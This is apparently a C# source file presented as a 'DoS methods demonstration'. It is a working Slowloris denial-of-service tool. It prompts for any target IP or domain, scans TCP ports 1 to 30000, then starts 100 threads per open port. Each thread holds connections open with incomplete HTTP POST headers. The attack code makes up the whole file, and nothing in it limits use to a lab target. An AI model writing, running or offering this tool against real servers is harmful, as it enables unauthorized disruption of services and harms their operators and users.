using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace DoSMethodsDemonstration
{
    public class SlowLoris1
    {
        #region var´s
        private static bool _stop;
        private static int _startPort = 1;
        private static int _endPort = 30000;

        private static readonly List<int> OpenPorts = new List<int>();
        private static readonly object ConsoleLock = new object();
        private static int _waitingForResponses;
        private const int MaxQueriesAtOneTime = 10000;
        #endregion

        public static void Main()
        {
            try
            {
                Console.Write("Enter the Targets I.P or Domain : ");
                string target = Console.ReadLine();

                int threadSleep = 20000;

                IPAddress ipAddress = GetAddress(target);

                ThreadPool.QueueUserWorkItem(StartScan, ipAddress);

                Console.WriteLine("Wait for the Thread to finish or press ENTER");

                Console.ReadKey();

                _stop = true;

                Console.Clear();
                Console.WriteLine("Waiting for sockets");
                Thread.Sleep(20000);

                Console.Clear();

                foreach (int openPort in OpenPorts)
                {
                    for (int i = 0; i < 100; i++)
                    {
                        SlowlorisAttack slow = new SlowlorisAttack(target, openPort, threadSleep, i);
                        ThreadStart st = new ThreadStart(slow.Manage);

                        Thread slowThread = new Thread(st);
                        slowThread.Start();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message + "|" + ex.StackTrace);
            }
        }

        /// <summary>
        /// Gets the Ip Address
        /// </summary>
        /// <param name="ip">Ip to convert</param>
        /// <returns>Returns IPAddress</returns>
        private static IPAddress GetAddress(string ip)
        {
            if (ip.Contains("www"))
                if (ip.Contains("https"))
                    if (ip.EndsWith("/"))
                    {
                        string retVal = ip.Replace("https://", "");
                        return Dns.GetHostAddresses(retVal.Substring(0, retVal.Length - 1))[0];
                    }
                    else
                        return Dns.GetHostAddresses(ip.Replace("https://", ""))[0];
                else
                    return Dns.GetHostAddresses(ip)[0];
            else
                return IPAddress.Parse(ip);
        }



        #region GetPorts

        private static void StartScan(object o)
        {
            IPAddress ipAddress = o as IPAddress;

            for (int i = _startPort; i < _endPort; i++)
            {
                lock (ConsoleLock)
                {
                    int top = Console.CursorTop;

                    Console.CursorTop = 10;
                    Console.WriteLine("Scanning Port: {0}    ", i);

                    Console.CursorTop = top;
                }

                while (_waitingForResponses >= MaxQueriesAtOneTime)
                    Thread.Sleep(0);

                if (_stop)
                    break;

                try
                {
                    Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                    s.BeginConnect(new IPEndPoint(ipAddress ?? throw new InvalidOperationException(), i), EndConnect, s);

                    Interlocked.Increment(ref _waitingForResponses);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
        }

        private static void EndConnect(IAsyncResult ar)
        {
            try
            {
                DecrementResponses();

                if (ar.AsyncState is Socket s)
                {
                    s.EndConnect(ar);

                    if (s.Connected)
                    {
                        int openPort = Convert.ToInt32(s.RemoteEndPoint.ToString().Split(':')[1]);

                        OpenPorts.Add(openPort);

                        lock (ConsoleLock)
                        {
                            Console.WriteLine("Connected TCP on Port: {0}", openPort);
                        }

                        s.Disconnect(true);
                    }
                }
            }
            catch (Exception)
            {
                //occures when closed so no exception (could save into error log)
            }
        }

        private static void DecrementResponses()
        {
            Interlocked.Decrement(ref _waitingForResponses);

            PrintWaitingForResponses();
        }

        private static void PrintWaitingForResponses()
        {
            lock (ConsoleLock)
            {
                int top = Console.CursorTop;
                Console.CursorTop = 11;
                Console.WriteLine("Waiting for responses from {0} sockets ", _waitingForResponses);

                Console.CursorTop = top;
            }
        }
        #endregion
    }

    class SlowlorisAttack
    {
        public bool Loop = false;
        public string Website;
        public int Count = 0;
        public int Port;
        public int ThreadSleep;
        public int Id;



        public SlowlorisAttack(string host, int port, int threadSleep, int id)
        {
            Website = host;
            this.Port = port;
            this.Loop = true;
            this.ThreadSleep = threadSleep;
            Id = id;
        }

        public void Manage()
        {
            try
            {
                ThreadStart start = null;
                List<TcpClient> clients = new List<TcpClient>();

                while (Loop)
                {

                    if (start == null)
                    {

                        start = delegate
                        {
                            TcpClient item = new TcpClient();
                            clients.Add(item);

                            try
                            {
                                item.Connect(Website, Port);
                                StreamWriter writer = new StreamWriter(item.GetStream());
                                writer.Write("POST / HTTP/1.1\r\nHost: " + Website + "\r\nContent-length: 5235\r\n\r\n");
                                writer.Flush();
                                if (Loop)
                                    Log("Send: '" + Count + "' by '" + Id + "' to '" + Port + "'");
                                Count++;

                            }
                            catch (Exception ex)
                            {
                                if (Loop)
                                {
                                    Log("Unable to connect");
                                }
                                Console.WriteLine(ex.Message);
                                Loop = false;
                            }
                        };
                    }

                    new Thread(start).Start();
                    Thread.Sleep(ThreadSleep);
                }

                foreach (TcpClient client in clients)
                {

                    try
                    {
                        client.GetStream().Dispose();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message + "| " + ex.StackTrace);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        /// <summary>
        /// Logging message
        /// </summary>
        /// <param name="msg"></param>
        private void Log(string msg) => Console.WriteLine("[" + DateTime.Now + "] " + msg);

    }
}